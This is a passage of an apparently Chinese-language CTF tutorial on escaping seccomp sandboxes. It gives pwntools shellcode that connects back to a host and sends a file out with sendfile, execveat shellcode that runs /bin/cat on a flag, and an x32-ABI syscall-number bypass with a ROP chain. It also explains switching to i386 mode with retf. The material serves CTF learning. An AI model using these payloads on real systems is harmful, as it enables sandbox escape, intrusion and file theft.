class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h5 id="主动回连"><a href="#主动回连" class="headerlink" title="主动回连"></a>主动回连</h5><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"></span><br><span class="line">context.arch   = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os     = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_shellcode</span>(<span class="params">ip: <span class="built_in">str</span>, port: <span class="built_in">int</span>, path=<span class="string">&quot;flag&quot;</span>, count=<span class="number">0x1000</span></span>):</span><br><span class="line">    ipb = ipaddress.IPv4Address(ip).packed  <span class="comment"># b&#x27;a.b.c.d&#x27;</span></span><br><span class="line">    <span class="comment"># 让内存布局变成: 02 00 port_hi port_lo a b c d</span></span><br><span class="line">    header = (</span><br><span class="line">        (ipb[<span class="number">3</span>] &lt;&lt; <span class="number">56</span>) | (ipb[<span class="number">2</span>] &lt;&lt; <span class="number">48</span>) | (ipb[<span class="number">1</span>] &lt;&lt; <span class="number">40</span>) | (ipb[<span class="number">0</span>] &lt;&lt; <span class="number">32</span>) |</span><br><span class="line">        ((port &amp; <span class="number">0xff</span>) &lt;&lt; <span class="number">24</span>) | (((port &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) &lt;&lt; <span class="number">16</span>) | (<span class="number">0</span> &lt;&lt; <span class="number">8</span>) | <span class="number">2</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    sc = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        /* socket(AF_INET, SOCK_STREAM, 0) */</span></span><br><span class="line"><span class="string">        mov     al, 41</span></span><br><span class="line"><span class="string">        push    2</span></span><br><span class="line"><span class="string">        pop     rdi</span></span><br><span class="line"><span class="string">        push    1</span></span><br><span class="line"><span class="string">        pop     rsi</span></span><br><span class="line"><span class="string">        xor     edx, edx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        xchg    eax, edi                /* rdi = sockfd (1字节编码) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* sockaddr_in 入栈: [fam=2,port,addr] + sin_zero(8) */</span></span><br><span class="line"><span class="string">        push    0</span></span><br><span class="line"><span class="string">        mov     rbx, 0x<span class="subst">&#123;header:016x&#125;</span></span></span><br><span class="line"><span class="string">        push    rbx</span></span><br><span class="line"><span class="string">        mov     rsi, rsp</span></span><br><span class="line"><span class="string">        xor     edx, edx</span></span><br><span class="line"><span class="string">        mov     dl, 16                  /* rdx = 16 */</span></span><br><span class="line"><span class="string">        mov     al, 42                  /* connect */</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* open(path, O_RDONLY, 0) */</span></span><br><span class="line"><span class="string">        push    rdi                     /* 保存 sockfd */</span></span><br><span class="line"><span class="string">        lea     rdi, [rip+path]</span></span><br><span class="line"><span class="string">        xor     esi, esi</span></span><br><span class="line"><span class="string">        xor     edx, edx</span></span><br><span class="line"><span class="string">        mov     al, 2                   /* open */</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        xchg    eax, esi                /* rsi = fd */</span></span><br><span class="line"><span class="string">        pop     rdi                     /* 取回 sockfd */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* sendfile(sockfd, fd, NULL, count) */</span></span><br><span class="line"><span class="string">        xor     edx, edx                /* off = NULL */</span></span><br><span class="line"><span class="string">        mov     r10d, <span class="subst">&#123;count&#125;</span></span></span><br><span class="line"><span class="string">        mov     al, 40                  /* sendfile */</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    path: .asciz &quot;<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sc = make_shellcode(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">4444</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;len =&quot;</span>, <span class="built_in">len</span>(sc))</span><br><span class="line">    run_shellcode(sc)</span><br></pre></td></tr></table></figure></div>

<h4 id="execve-替代系统调用"><a href="#execve-替代系统调用" class="headerlink" title="execve 替代系统调用"></a>execve 替代系统调用</h4><h5 id="execveat"><a href="#execveat" class="headerlink" title="execveat"></a>execveat</h5><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fcntl.h&gt;</span> <span class="comment">// AT_* 常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execveat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *path,</span></span><br><span class="line"><span class="params">             <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[],</span></span><br><span class="line"><span class="params">             <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>参数：</strong><ul>
<li><code>dirfd</code>：目录文件描述符；可取 <strong><code>AT_FDCWD</code><strong>（-100）按当前工作目录解析；也可为</strong>指向可执行文件本身的 fd</strong>，配合 <strong><code>AT_EMPTY_PATH</code></strong> 使用。可用 <code>O_PATH</code> 打开目标得到仅指示位置的 fd。</li>
<li><code>path</code>：相对路径时相对 <code>dirfd</code> 解析；绝对路径时忽略 <code>dirfd</code>；当传 <code>&quot;&quot;</code> 且 <code>flags</code> 含 <code>AT_EMPTY_PATH</code> 时，直接以 <code>dirfd</code> 指向的文件执行。</li>
<li><code>flags</code>：<ul>
<li>**<code>AT_EMPTY_PATH</code>**：允许 <code>path=&quot;&quot;</code> 并对 <code>dirfd</code> 指向的文件执行；</li>
<li>**<code>AT_SYMLINK_NOFOLLOW</code>**：遇到符号链接时失败并返回 <code>ELOOP</code>；</li>
<li><strong><code>AT_EXECVE_CHECK</code><strong>（</strong>Linux 6.14+<strong>）：</strong>仅执行“可执行性检查”</strong>，不真正执行，返回 0 表示在当前策略下允许执行；适合解释器&#x2F;动态链接器对脚本或依赖做一致性检查。</li>
</ul>
</li>
</ul>
</li>
<li><strong>返回值</strong>：<ul>
<li>成功不会返回；</li>
<li>失败返回 -1 并设置 <code>errno</code>。</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>引入内核</strong>：Linux <strong>3.19</strong>；<strong>glibc</strong> 提供包装自 <strong>2.34</strong> 起（更早版本可用 <code>syscall(SYS_execveat, ...)</code>）。**<code>AT_EXECVE_CHECK</code>**：Linux <strong>6.14</strong> 新增（脚本执行一致性&#x2F;安全位 <code>SECBIT_EXEC_*</code> 配套）。</p>
<p><strong>15.04 (Vivid)</strong> 默认内核 <strong>3.19</strong> → <strong>支持 <code>execveat</code><strong>；</strong>14.04.3 LTS（HWE 栈）</strong>也切到 3.19。</p>
<p><strong>24.04.3 LTS（HWE）</strong> 对应内核 <strong>6.14</strong> → 支持 **<code>AT_EXECVE_CHECK</code>**；25.04 及之后常规系列同理。</p>
</blockquote>
<p>注意：由于沙箱会被子进程继承，因此即使 <code>execveat</code> 执行了 <code>/bin/sh</code>，由于 <code>/bin/sh</code> 内部使用 <code>execve</code> 执行程序，因此我们不能用这个 <code>/bin/sh</code> 执行任何命令。因此常见的方法是借助 <code>execveat</code> 执行 <code>/bin/cat</code> 来读取 <code>flag</code> 内容。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* execveat(AT_FDCWD, &quot;/bin/cat&quot;, [&quot;cat&quot;,&quot;flag&quot;,NULL], NULL, 0) */</span></span><br><span class="line"><span class="string">    mov rdi, -100                 /* AT_FDCWD */</span></span><br><span class="line"><span class="string">    lea rsi, [rip+bin]            /* path = &quot;/bin/cat&quot; */</span></span><br><span class="line"><span class="string">    lea rbx, [rip+arg1]           /* &quot;flag&quot; */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* argv 数组：&#123; &quot;/bin/cat&quot;, &quot;flag&quot;, NULL &#125; */</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    push rax                      /* NULL */</span></span><br><span class="line"><span class="string">    push rbx                      /* &amp;&quot;flag&quot; */</span></span><br><span class="line"><span class="string">    push rsi                      /* &amp;&quot;/bin/cat&quot; */</span></span><br><span class="line"><span class="string">    mov rdx, rsp                  /* argv */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor r10, r10                  /* envp = NULL */</span></span><br><span class="line"><span class="string">    xor r8,  r8                   /* flags = 0 */</span></span><br><span class="line"><span class="string">    mov eax, 322                  /* SYS_execveat */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* 如果失败就 exit(0)；成功的话进程会被 /bin/cat 替换，不会执行到这里 */</span></span><br><span class="line"><span class="string">    xor edi, edi</span></span><br><span class="line"><span class="string">    mov eax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bin:  .asciz &quot;/bin/cat&quot;</span></span><br><span class="line"><span class="string">arg1: .asciz &quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="32-位绕过"><a href="#32-位绕过" class="headerlink" title="32 位绕过"></a>32 位绕过</h3><p>在 64 位系统中，32位在<strong>软件层面</strong>和<strong>硬件层面</strong>有下面两类概念：</p>
<ul>
<li><strong>CPU 运行模式 &#x2F; 指令集</strong>：<em>32 位保护模式</em>（老的 i386 指令集，<code>int 0x80</code>&#x2F;<code>sysenter</code>） vs. <em>64 位长模式</em>（x86‑64 指令集，<code>syscall</code>）。</li>
<li><strong>ABI 的数据模型</strong>：<em>ILP32</em>（<code>int</code>&#x2F;<code>long</code>&#x2F;指针 32 位） vs. <em>LP64</em>（<code>long</code>&#x2F;指针 64 位）。</li>
</ul>
<p>据此有三种常见组合：</p>
<ul>
<li><p><strong>x86‑64（“普通的”64 位）</strong> &#x3D; <em>64 位指令集</em> <strong>+</strong> <em>LP64</em><br>大家日常用的 64 位 ABI，这里只是拿来对照。</p>
</li>
<li><p><strong>i386（x86‑32、IA‑32）</strong> &#x3D; <em>32 位指令集</em> <strong>+</strong> <em>ILP32</em><br>纯 32 位用户态&#x2F;寄存器&#x2F;地址空间；在 64 位内核里经由 <strong>compat</strong> 路径支持它（<code>entry_INT80_compat</code> 等），用 <strong>i386 的号表</strong> 与寄存器约定（<code>EAX</code>&#x3D;号；参数在 <code>EBX,ECX,EDX,ESI,EDI,EBP</code>）。</p>
</li>
<li><p><strong>x32</strong> &#x3D; <em>64 位指令集</em> <strong>+</strong> <em>ILP32</em><br>仍然在 64 位长模式下跑、用 64 位寄存器与 <code>syscall</code> 指令，但把 <code>long/指针</code> 定义为 32 位，以换取更小的指针&#x2F;更好的缓存利用；本质是“<strong>ILP32 on x86‑64</strong>”的 ABI。</p>
</li>
</ul>
<p>其中 i386 和 x32 <strong>都</strong>是 <em>ILP32</em> 数据模型（指针&#x2F;<code>long</code> 32 位）。但是两者并不完全等价：</p>
<ul>
<li><strong>i386</strong> 在<strong>硬件上</strong>跑的是 32 位指令集&#x2F;32 位模式；在 64 位内核中通过 <strong>compat</strong> 入口（如 <code>entry_INT80_compat</code>）接系统调用，用 <strong>i386 专门的号表</strong>与 32 位寄存器 ABI。</li>
<li><strong>x32</strong> 在<strong>硬件上</strong>跑的是 64 位长模式&#x2F;指令集（寄存器是 64 位，入口是 <code>syscall</code>）；区分方法是把系统调用号与 <strong><code>__X32_SYSCALL_BIT</code>（0x40000000）</strong> 做 OR，内核据此走 <strong>x32 的那套处理&#x2F;号表</strong>。另外，为了结构体大小差异，x32 还在号表里从 <strong>512</strong> 开始补了一批“x32 专用”的系统调用号。</li>
</ul>
<p>也就是说 <strong>i386 是“32 位指令集 + ILP32”，x32 是“64 位指令集 + ILP32”。</strong>前者是历史兼容，后者是性能&#x2F;占用的折中设计。</p>
<h4 id="使用-x32-模式系统调用"><a href="#使用-x32-模式系统调用" class="headerlink" title="使用 x32 模式系统调用"></a>使用 x32 模式系统调用</h4><p>在 x86‑64 上，<strong>x86‑64 ABI</strong> 和 <strong>x32 ABI</strong> 在 seccomp 的 <code>arch</code> 字段里**都呈现为 <code>AUDIT_ARCH_X86_64</code>**；</p>
<blockquote>
<p><strong><code>arch</code></strong> 是 <strong>seccomp 提供给 BPF 过滤器的“审计架构（audit architecture）标识”</strong>。它用于标明<strong>这次系统调用是按哪套 ABI&#x2F;调用约定进来的</strong>，以便过滤器先分清“这一拨号表&#x2F;语义该用哪一套”。</p>
<p>当线程陷入系统调用路径时，内核会构造一份 <code>seccomp_data</code> 交给 BPF 过滤器，其中就包括 <code>arch</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>   nr;                  <span class="comment">// 系统调用号</span></span><br><span class="line">    __u32 arch;                <span class="comment">// AUDIT_ARCH_* 值（见 &lt;linux/audit.h&gt;）</span></span><br><span class="line">    __u64 instruction_pointer; <span class="comment">// 触发指令地址</span></span><br><span class="line">    __u64 args[<span class="number">6</span>];             <span class="comment">// 最多 6 个参数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>也就是说，**<code>arch</code> 是内核通过 <code>syscall_get_arch()</code> 计算出来的**；在 x86 上，这个函数会根据当前调用约定（原生 x86‑64、x32，或 i386 兼容路径）返回相应的 <code>AUDIT_ARCH_*</code>。</p>
</blockquote>
<p>区分二者要看系统调用号是否带 <strong><code>__X32_SYSCALL_BIT</code> (&#x3D; 0x40000000, 第 30 位)<strong>。过滤器如果只在号上做黑名单匹配、</strong>又不专门处理这个位</strong>，就会被 <code>nr | 0x40000000</code> 绕过。</p>
<blockquote>
<p>在 x86‑64 上有两套 ABI 可以用系统调用：<strong>x86‑64 ABI</strong> 和 <strong>x32 ABI</strong>。它们<strong>共用同一个 <code>arch</code> 值</strong>：<code>AUDIT_ARCH_X86_64</code>。因此内核<strong>不是靠 <code>arch</code> 字段</strong>来区分两套 ABI，而是靠把 <strong><code>__X32_SYSCALL_BIT (0x40000000)</code></strong> 置到<em>系统调用号的第 30 位</em>。</p>
</blockquote>
<p>一旦调用号上带了 <code>__X32_SYSCALL_BIT</code>，内核就按 <strong>x32 ABI</strong> 的路径处理（ILP32：<code>long</code>&#x2F;指针是 32 位，结构体版式可能不同），虽然入口指令仍然是 <code>syscall</code>。</p>
<blockquote>
<p>对不少调用，x32 号确实是“x86‑64 号 | <code>__X32_SYSCALL_BIT</code>”；并且从<strong>入口机制</strong>看，x32 和 x86‑64 都用 <code>syscall</code> 指令、寄存器传参（<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>r10</code>,<code>r8</code>,<code>r9</code>）。但从<strong>ABI 语义</strong>看，x32 是 <strong>ILP32</strong>（<code>long</code>&#x2F;指针 32 位），因此：</p>
<ul>
<li>部分结构体（如 <code>timeval</code>&#x2F;<code>rlimit</code> 等）在 x32 与 x86‑64 下<strong>版式不同</strong>；</li>
<li>为适配这些差异，内核给 x32 <strong>单独加了一批号位</strong>，<strong>从 512 起</strong>（不带位的“底数”），实际调用号是“<code>512+N</code> 再或上 <code>__X32_SYSCALL_BIT</code>”。例如：x86‑64 的 <code>readv</code> 是 <strong>19</strong>，x32 的却是 **<code>__X32_SYSCALL_BIT | 515</code>**。</li>
</ul>
<p>所以，更准确地说：<strong>它是 x32 语义的系统调用</strong>，只是与 x86‑64 共用一套 arch 标识与入口机制；<strong>不是</strong>“普通的 x86‑64 调用”。<strong>不能</strong>笼统地认为“去掉标志位就与 x86‑64 号完全一致”。</p>
</blockquote>
<p>例如下面这种情况，虽然所有可例用的系统调用号都被禁了，但是由于没有判断 <code>sys_number &gt;= 0x40000000</code> 的情况，因此可以使用 <code>0x40000000|sys_number</code> 来绕过。这里 <code>sys_number</code> 是 64 位的系统调用号。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line">0004: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0009</span><br><span class="line">0005: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0009</span><br><span class="line">0006: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 0009</span><br><span class="line">0007: 0x15 0x01 0x00 0x00000130  if (A == open_by_handle_at) goto 0009</span><br><span class="line">0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>

<p>当内核拿到系统调用号时，会检查是否带有 <code>__X32_SYSCALL_BIT</code>，据此把请求路由到对应的处理路径&#x2F;表项（x86‑64 还是 x32 的“compat”路径）。这就是 x32 ABI 的设计：<strong>通过号上的一个掩码位来分流</strong>，而不是改变 <code>arch</code> 字段。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">rop_addr = <span class="number">0xdeadbeef</span>               <span class="comment"># 栈上 ROP 开始地址（自己按泄露结果改）</span></span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># openat(AT_FDCWD, &quot;./flag&quot;, 0, 0)</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">257</span> | <span class="number">0x40000000</span>)  <span class="comment"># SYS_openat</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64((-<span class="number">100</span>) % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>))   <span class="comment"># AT_FDCWD</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0xdeadbeef</span>)               <span class="comment"># pathname</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx; pop r12; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0</span>)                    <span class="comment"># flags</span></span><br><span class="line">rop += p64(<span class="number">0</span>)                    <span class="comment"># dummy for pop r12</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(3, buf, 0x100)</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0</span> | <span class="number">0x40000000</span>)       <span class="comment"># SYS_read</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx; pop r12; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># write(1, buf, 0x100)</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">1</span> | <span class="number">0x40000000</span>)       <span class="comment"># SYS_write</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx; pop r12; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(rop) &lt;= <span class="number">0x100</span></span><br><span class="line">rop = rop.replace(p64(<span class="number">0xdeadbeef</span>), p64(rop_addr + <span class="built_in">len</span>(rop)))</span><br><span class="line">rop += <span class="string">b&#x27;/flag\x00&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h4 id="切换到-i386-模式"><a href="#切换到-i386-模式" class="headerlink" title="切换到 i386 模式"></a>切换到 i386 模式</h4><p>处理器处在 64 位长模式（IA‑32e）时，还存在一个 <strong>兼容子模式（compatibility sub‑mode）</strong>：代码按 32 位解码执行、使用 32 位的 <code>EIP/ESP</code>，但仍运行在 64 位分页下。是否进入兼容子模式由<strong>当前代码段描述符</strong>决定（即 <code>CS</code> 指向的段描述符）。</p>
<p><strong><code>retf</code>（far return，远返回）</strong> 会从栈上<strong>弹出返回偏移（IP&#x2F;RIP）与新的代码段选择子（CS）</strong>，从而完成跨段跳转；如果新 CS 对应的是“<strong>32 位兼容段</strong>”，CPU 就切入兼容子模式继续跑 32 位指令。这是指令集定义的标准行为。</p>
<p>进入兼容模式后只看 32 位 <code>EIP/ESP</code>，高位会被截断，所以<strong>落点地址与当前栈顶必须在 4 GB 之下</strong>，否则会崩。这个限制完全来自 CPU 对兼容模式的定义（与 Linux 无关）。</p>
<p>在 x86‑64 的内核入口代码里，不同的陷入路径会被<strong>路由到不同的处理例程</strong>：</p>
<ul>
<li>64 位代码用 <code>syscall</code> 指令，走 <code>system_call</code> 入口 → <strong>原生 x86‑64 号表</strong>；</li>
<li>32 位代码（或显式使用 <code>int 0x80</code>）走 <strong>compat 入口</strong>（如 <code>entry_INT80_compat</code>）→ <strong>i386 号表</strong>；内核会按 32 位 ABI 取参&#x2F;返回。</li>
</ul>
<p>你的 32 位阶段之所以用 <code>int 0x80</code> 发起系统调用，正是为了<strong>明确走 compat 路径</strong>，让 <code>EAX=5</code> 被解释为 **i386 的 <code>open</code>**，而不是 x86‑64 的 <code>fstat</code>。对于 64 位阶段再回到长模式，继续用 <code>syscall</code> 做 <code>read/write</code> 输出。</p>
<p>例如这道<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/27" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，该题目的沙箱规则如下：</p>
